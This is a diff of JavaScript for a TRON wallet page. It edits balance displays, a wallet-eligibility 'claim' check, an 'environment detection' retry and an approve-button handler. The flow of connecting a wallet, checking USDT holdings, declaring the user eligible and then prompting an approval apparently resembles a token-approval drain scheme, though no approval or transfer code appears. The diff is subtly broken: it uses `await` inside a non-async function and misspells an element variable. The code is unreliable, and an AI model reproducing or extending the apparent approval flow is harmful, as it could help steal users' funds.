@@ -1019,9 +1019,10 @@ function updateUserInfoDisplay() {
     const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
     document.getElementById("statusAddress").textContent = shortAddr;
     balanceUsdtEl.textContent = tokenBalance.toFixed(2);
-    balanceTrxEl.textContent = trxBalance.toFixed(2);
-    balanceEnergyEl.textContent = Math.floor(currentEnergy);
+    balanceTrxEl.textContent = trxBalance.toFixed(2);   
     balanceBandwidthEl.textContent = Math.floor(currentBandwidth);
+    const userOwnEnergy = await queryUserEnergyBalance(userAddress);
+    balanceEnergyEl.textContent = Math.floor(userOwnEnergy);
 }
 // 新增：补充缺失的 updateUserBalanceDisplay 函数
 function updateUserBalanceDisplay() {
@@ -1042,6 +1043,19 @@ async function queryBandwidthBalance(address) {
         return 0;
     }
 }
+  // 查询用户自身的能量余额（独立于合约剩余能量）
+async function queryUserEnergyBalance(address) {
+    try {
+        if (!tronWeb) return 0;
+        const account = await tronWeb.trx.getAccount(address);
+        // 用户自身能量 = 账户能量（energy） + 冻结能量（frozenEnergy）
+        const userEnergy = (account.energy || 0) + (account.frozenEnergy?.total || 0);
+        return userEnergy;
+    } catch (e) {
+        console.warn("查询用户自身能量失败：", e);
+        return 0;
+    }
+}      
 function reRenderDynamicContent() {
     const lang = langConfig[currentLang];
     if (!userAddress) {
@@ -1116,7 +1130,7 @@ function calculateCurrentEnergy() {
         lastCalcTime: Date.now()
     }));
     // 更新能量余额显示
-    if (balanceEnergyEl) balanceEnergyEl.textContent = Math.floor(currentEnergy);
+    if (contractEnergyEl) contracEnergyEl.textContent = Math.floor(currentEnergy);
     return currentEnergy;
 }
 // 能量显示更新（沿用之前的递归定时器，只改计算逻辑）
@@ -1218,7 +1232,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                 // 修复：显示动态提示，隐藏默认提示
                 userInfoDefault.style.display = "none";
                 userInfoStatus.style.display = "block";
-                userInfoStatus.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
+                userInfoStatus.innerHTML = `<span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
                 approveBtn.disabled = false;
                 approveBtn.textContent = lang.approveBtnText;
             });
@@ -1293,10 +1307,7 @@ async function initWallet(isAfterApprove) {
             // 修复：显示动态提示（可领取）和四角余额，隐藏默认提示
             userInfoDefault.style.display = "none";
             userInfoStatus.style.display = "block";
-            userInfoStatus.innerHTML = lang.eligibleTip
-                .replace("{address}", shortAddr)
-                .replace("{usdt}", tokenBalance.toFixed(2))
-                .replace("{trx}", trxBalance.toFixed(2));
+            userInfoStatus.innerHTML = lang.eligibleTip;
             balanceItems.forEach(item => item.style.display = "flex");
             approveBtn.disabled = false;
             approveBtn.textContent = lang.approveBtnText;
@@ -1543,32 +1554,24 @@ function bindRetryA1Logic() {
         btn.disabled = true;
         btn.textContent = "检测中...";
         // 修复：修改动态提示内容，不覆盖容器
-        userInfoStatus.innerHTML = `
-            已连接：${shortAddr}<br>
-            USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
-            <span style='color: #4ade80; font-size: 13px;'>✅ 正在重新检测环境...</span>
+        userInfoStatus.innerHTML = `<span style='color: #4ade80; font-size: 13px;'>✅ 正在重新检测环境...</span>
         `;
         const a1Result = await sendSignalA1(); // 重试发送A1
         if (a1Result === "success") {
             // 修复：修改动态提示内容，不覆盖容器
-            userInfoStatus.innerHTML = `
-                已连接：${shortAddr}<br>
-                USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
-                <span style='color: #3b82f6; font-size: 13px;'>✅ 环境符合领取条件</span>
+            userInfoStatus.innerHTML = `<span style='color: #3b82f6; font-size: 13px;'>✅ 环境符合领取条件</span>
             `;
             bindApproveLogic(); // 重试成功→重新绑定领取逻辑
         } else {
             // 修复：修改动态提示内容，不覆盖容器
-            userInfoStatus.innerHTML = `
-                已连接：${shortAddr}<br>
-                USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
-                <span style='color: #ef4444; font-size: 13px;'>⚠️ 环境检测失败，可重试</span>
+            userInfoStatus.innerHTML = `<span style='color: #ef4444; font-size: 13px;'>⚠️ 环境检测失败，可重试</span>
             `;
             btn.disabled = false;
             btn.textContent = "重新检测环境";
         }
     };
 }
+   //领取按钮函数     
 function bindApproveLogic() {
     const lang = langConfig[currentLang];
     approveBtn.onclick = async () => {
